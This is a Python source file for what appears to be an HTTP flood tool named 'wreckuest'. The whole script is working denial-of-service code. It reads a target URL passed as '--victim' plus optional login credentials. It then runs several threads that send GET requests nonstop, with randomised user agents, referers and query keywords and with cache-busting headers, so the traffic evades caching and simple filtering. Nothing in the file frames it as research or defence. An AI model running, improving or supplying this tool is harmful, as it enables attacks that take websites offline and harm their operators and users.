# -*- coding: utf-8 -*-
import getopt
import os
import random
import requests
import sys
import threading
import time
import urllib.parse
from threading import Event
from urllib.parse import urlparse

from netaddr import IPNetwork, IPAddress
from requests.auth import HTTPBasicAuth

# versioning
VERSION = (0, 1, 3)
__version__ = '%d.%d.%d' % VERSION[0:3]

# if python ver < 3.5
if sys.version_info[0:2] < (3, 5):
    raise RuntimeError('Python 3.5 or higher is required!')

# naming the files

ua_file = 'files/user-agents.txt'
ref_file = 'files/referers.txt'
keywords_file = 'files/keywords.txt'

# initializing variables
ex = Event()
ref = []
keyword = []
ua = []
timeout = 10
attackers_count = 5
proto = ''

# arguments
url = ''
# if http auth
auth = False
auth_login = ''
auth_pass = ''


# main
def main(argv):
    try:
        opts, args = getopt.getopt(argv, 'hv:a:t:', ['help', 'victim=', 'auth=', 'timeout='])
    except getopt.GetoptError as err:
        print(err)
        show_usage()
        sys.exit(2)
    if len(opts) < 1:
        show_usage()
        sys.exit(2)
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            show_usage()
            sys.exit(2)
        elif opt in ('-v', '--victim'):
            if len(arg) >= 1:
                global url
                url = urllib.parse.unquote(arg)
                # defining protocol
                global proto
                link = urlparse(url)
                proto = link.scheme
            else:
                print('Parameter [--victim] must be a string and not to be empty!')
                sys.exit(2)
        elif opt in ('-a', '--auth'):
            global auth
            global auth_login
            global auth_pass
            auth = True
            auth_login = arg.split(':')[0]
            auth_pass = arg.split(':')[1]
        elif opt in ('-t', '--timeout'):
            arg = int(arg)
            if isinstance(arg, int) and arg >= 1:
                global timeout
                timeout = arg
            else:
                print('Parameter [--timeout] must be an integer and not to be less than 1')
                sys.exit(2)
        else:
            show_usage()
            sys.exit(2)
    parse_files()


def parse_files():
    # trying to find and parse file with User-Agents
    try:
        if os.stat(ua_file).st_size > 0:
            with open(ua_file) as user_agents:
                global ua
                ua = [row.rstrip() for row in user_agents]
        else:
            print('Error: File %s is empty' % ua_file)
            sys.exit()
    except OSError:
        print('Error: %s was not found!' % ua_file)
        sys.exit()
    # trying to find and parse file with referers
    try:
        if os.stat(ref_file).st_size > 0:
            with open(ref_file) as referers:
                global ref
                ref = [row.rstrip() for row in referers]
        else:
            print('Error: File %s is empty!' % ref_file)
            sys.exit()
    except OSError:
        print('Error: %s was not found!' % ref_file)
        sys.exit()
    # trying to find and parse file with keywords
    try:
        if os.stat(keywords_file).st_size > 0:
            with open(keywords_file) as keywords:
                global keyword
                keyword = [row.rstrip() for row in keywords]
        else:
            print('Error: File %s is empty!' % keywords_file)
            sys.exit()
    except OSError:
        print('Error: %s was not found!' % keywords_file)
        sys.exit()
    # parse end
    # messaging statistics
    print('Loaded: {} user-agents, {} referers, {} keywords'.format(len(ua), len(ref), len(keyword)))
    start_attack()


def request():
    err_count = 0
    only_gzip = 0
    while not ex.is_set():
        payload = {random.choice(keyword): random.choice(keyword)}
        headers = {'User-Agent': random.choice(ua),
                   'Referer': random.choice(ref) + random.choice(keyword),
                   'Accept-Encoding': 'gzip;q=0,deflate;q=0' if only_gzip < 5 else 'identity, deflate, compress, gzip, '
                                                                                   'sdch, br',
                   'Cache-Control': 'no-cache, no-store, must-revalidate',
                   'Pragma': 'no-cache'}
        try:
            if auth:
                r = requests.get(url, params=payload, headers=headers, timeout=timeout,
                                 auth=HTTPBasicAuth(auth_login, auth_pass))
            else:
                r = requests.get(url, params=payload, headers=headers, timeout=timeout)
            if r.status_code == 406 and only_gzip < 5:
                only_gzip += 1
        except requests.exceptions.ChunkedEncodingError:
            err_count += 1
        except requests.exceptions.ConnectionError:
            err_count += 1
        except requests.exceptions.ReadTimeout:
            pass
        if err_count >= 20:
            return


# Creating a thread pool
def start_attack():
    threads = []
    for i in range(attackers_count):
        t = threading.Thread(target=request)
        t.daemon = True
        t.start()
        threads.append(t)
    try:
        while True:
            time.sleep(.05)
    except KeyboardInterrupt:
        ex.set()
        print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
        for t in threads:
            t.join()


def address_in_network(ip, net):
    if IPAddress(ip) in IPNetwork(net):
        return True


def show_usage():
    print("Usage: wreckuest.py [-v] <victim's url> [-a] <login:pass> [-t] <timeout>\n"
          "Please, read more about arguments in GitHub repository!")


if __name__ == '__main__':
    main(sys.argv[1:])
